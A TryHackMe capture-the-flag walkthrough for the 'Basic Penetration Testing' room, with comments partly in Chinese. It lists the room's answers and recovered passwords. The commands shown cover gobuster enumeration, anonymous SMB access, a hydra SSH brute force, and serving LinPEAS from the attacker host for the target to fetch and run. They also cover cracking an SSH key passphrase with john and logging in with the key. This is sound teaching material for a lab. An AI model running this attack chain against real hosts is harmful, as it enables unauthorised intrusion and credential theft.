# Basic Penetration Testing

###### tags: `Tryhackme` `Hacking`
---

**1. Find the services exposed by the machine**
![](https://i.imgur.com/JXflykk.png)

**2. What is the name of the hidden directory on the web server(enter name without /)?**
    ~ development
    * Command: sudo gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://10.10.103.132 -t 20 -o gobusterscan.txt
![](https://i.imgur.com/sEPVnZ5.png)

![](https://i.imgur.com/D0kRrNd.png)

![](https://i.imgur.com/7WoSuEr.png)


**3. User brute-forcing to find the username & password**
    ~ No answer needed.
    
**4. What is the username?**
    ~ Jan
    * SMB servers has an option which allows anonymous users to login. Lets see if this setting is enabled and we can access the Share.
    * Command: 
        smbclient //10.10.103.132/anonymous
        get staff.txt
![](https://i.imgur.com/iu6xpS3.png)

![](https://i.imgur.com/NW76E2M.png)

**5. What is the password?**
    ~ armando
    * Command: hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.103.132 -t 16 ssh
![](https://i.imgur.com/B5vYs39.png)

**6. What service do you use to access the server(answer in abbreviation in all caps)?**
    ~ ssh

**7. Enumerate the machine to find any vectors for privilege escalation**
    ~ No answer needed
    * 先找到可以讓jan寫檔案的目錄(擇一) (Target機)
    find / -type d -maxdepth 2 -writable -exec ls -l {} +
![](https://i.imgur.com/STiwyGH.png)

    * 去Github下載LinPEAS - Linux Privilege Escalation Awesome Script (Kali)
    * Command: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh --output linpeas.sh
[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

    * 在下載的位置建立web server，然後從target機下載linpeas.sh
    * Command in Kali: python3 -m http.server 8888
    * Command in Target: wget 10.6.9.32:8888/linpeas.sh
    * Command in Target: chmod 755 linpeas.sh && ./linpeas.sh
    * 可以看到在下圖有一個pass.bak檔案還有id_rsa key
![](https://i.imgur.com/JWmSQiD.png)


**8. What is the name of the other user you found(all lower case)?**
    ~ kay
    * Command: cd /home && ls -l
    
![](https://i.imgur.com/wuBEnnD.png)

**9. If you have found another user, what can you do with this information?**
    ~ No answer needed

**10. What is the final password you obtain?**
    ~ heresareallystrongpasswordthatfollowsthepasswordpolicy$$
    * 我們有了kay的rsa key我們可以複製內容，然後在kali建立檔案並貼上
    * Command in Kali: touch kaysshkey
![](https://i.imgur.com/E4UdN3S.png)

    * 利用John The Ripper解hash
    * Command: ssh2john kaysshkey > johnjaysshkey
    * Command: john --wordlist=/usr/share/wordlists/rockyou.txt johnjaysshkey
    * 如果忘記截圖可以用john --show johnkaysshkey
![](https://i.imgur.com/UGPmOVO.png)

    * 然後有這個以後我們就可以登入了
    * Command: ssh kay@10.10.103.132 -i kaysshkey
![](https://i.imgur.com/5ln9Ehb.png)

    * 打開之前查到的pass.bak
    * Command: cat pass.bak
![](https://i.imgur.com/4lWrul3.png)
